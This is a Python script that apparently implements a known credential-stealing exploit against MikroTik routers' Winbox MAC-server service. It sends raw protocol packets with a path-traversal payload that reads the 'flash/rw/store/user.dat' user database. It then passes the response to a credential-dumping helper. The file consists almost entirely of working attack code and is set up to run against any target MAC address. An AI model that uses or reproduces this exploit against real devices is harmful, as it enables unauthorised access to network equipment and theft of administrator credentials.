import threading, socket, struct, time, sys, binascii
from extract_user import dump

# MAC server Winbox exploit by BigNerd95 (and mosajjal)

a = bytearray([0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00])

b = bytearray([0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00])

class MikrotikMACClient():

    START = 0
    DATA  = 1
    ACK   = 2
    END   = 255
    PROTO_VERSION = 1
    CLIENT_TYPE = 0x0F90
    SESSION_ID = 0x1234
    ADDR = ("255.255.255.255", 20561)
    HEADLEN = 22
    VERBOSE = False

    def __init__(self, mac):
        self.session_bytes_sent = 0
        self.session_bytes_recv = 0
        self.source_mac = b"\xff\xff\xff\xff\xff\xff" # put mac of your pc if mikrotik is not responding
        self.dest_mac = mac
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        self.buffer = []
        self.callback = None
        self.work = True
        self.connected = False
        self.rm = threading.Thread(target=self.__recv_manager__)
        self.rm.start()

        self.send_init()
    
    def __recv_manager__(self):
        while self.work:
            data, _ = self.sock.recvfrom(1024*64)
            self.parse_packet(data)

    def __buffer_pop__(self):
        while not self.buffer and self.connected:
            time.sleep(0.005)
        return self.buffer.pop()

    def recv_data(self, minlen=None, contains=None):
        d = self.__buffer_pop__()

        if minlen and not contains:
            while len(d) < minlen:
                d = self.__buffer_pop__()
        elif not minlen and contains:
            while not contains in d:
                d = m.__buffer_pop__()
        elif minlen and contains:
            while not contains in d or len(d) < minlen:
                d = m.__buffer_pop__()

        return d
            
    def parse_packet(self, data):
        _, packet_type = struct.unpack(">BB", data[:2])
        session_id, _, session_bytes = struct.unpack(">HHI", data[14:self.HEADLEN])

        if packet_type == self.DATA:
            self.print("New DATA")
            self.session_bytes_recv += len(data) - self.HEADLEN
            self.send_ack()

            self.buffer.append(data[self.HEADLEN:])
            self.connected = True

        elif packet_type == self.ACK:
            self.print("New ACK")
            self.connected = True
            self.session_bytes_sent = session_bytes
        elif packet_type == self.END:
            self.print("End session")
            self.connected = False
            self.work = False
            self.send_ack()
        else:
            self.print("Unknown packet")
            self.print(data)

        self.print("ID:", session_id, "Bytes:", session_bytes)
        
        if len(data) > self.HEADLEN:
            self.print("Data:", data[self.HEADLEN:])

        self.print()

    def send_ack(self):
        self.sock.sendto(self.__build_packet__(self.ACK), self.ADDR)

    def send_data(self, data, callback=None):
        self.callback = callback
        self.sock.sendto(self.__build_packet__(self.DATA, data), self.ADDR)

    def send_end(self):
        self.sock.sendto(self.__build_packet__(self.END), self.ADDR)

    def send_init(self):
        self.sock.sendto(self.__build_packet__(self.START), self.ADDR)
        while not self.connected:
            time.sleep(0.005)

    def __build_packet__(self, packet_type, data=b""):
        header = struct.pack(">BB",
            self.PROTO_VERSION,
            packet_type
        )
        header += self.source_mac
        header += self.dest_mac
        header += struct.pack(">HHI",
            self.SESSION_ID,
            self.CLIENT_TYPE,
            self.session_bytes_sent if packet_type == self.DATA else self.session_bytes_recv
        )
        return header + data

    def print(self, *msg):
        if self.VERBOSE:
            print(*msg)

    def quit(self):
        self.work = False
        self.send_end()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        mac = sys.argv[1]
        mac = binascii.unhexlify(mac.replace(':', ''))

        m = MikrotikMACClient(mac)

        m.send_data(a)
        d = m.recv_data(minlen=39)

        b[19] = d[38]

        m.send_data(b)
        d = m.recv_data(contains=b"\x11\x00\x00\x21")
        
        dump(d)
        m.quit()
        
    else:
        print("Usage: " + sys.argv[0] + " MAC_ADDRESS")
    